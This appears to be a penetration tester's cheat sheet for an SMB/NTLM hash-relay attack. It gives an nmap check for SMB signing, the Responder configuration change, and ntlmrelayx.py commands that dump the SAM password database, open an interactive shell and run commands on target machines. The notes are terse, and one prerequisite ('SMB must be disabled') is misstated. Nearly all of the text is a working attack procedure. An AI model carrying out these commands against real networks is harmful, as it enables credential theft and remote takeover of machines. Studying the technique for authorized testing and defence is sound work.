Capture hashes and relay them to another machine.  
useful if you can't crack the pswd
 
### nmap --script=smb2-security-mode.nse -p 445 -Pn <ip>

Look for SMB message signing not enabled/enforced  

## Prereqs

SMB must be disabled or not enforced  
User must be local Admin on the machine
 
## Tools

responder  
ntlmrelayx.py
 
## Attack

place target ips in a txt file
 
### nano /etc/responder/Responder.conf
 
Turn off HTTP and SMB servers in conf file
 
### /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support

### /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support -i

### /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support -c "whoami"
 
It wil dump the SAM
 
dump SAM (also look for shell info)  
get interactive shell (nc to the above address)  
execute command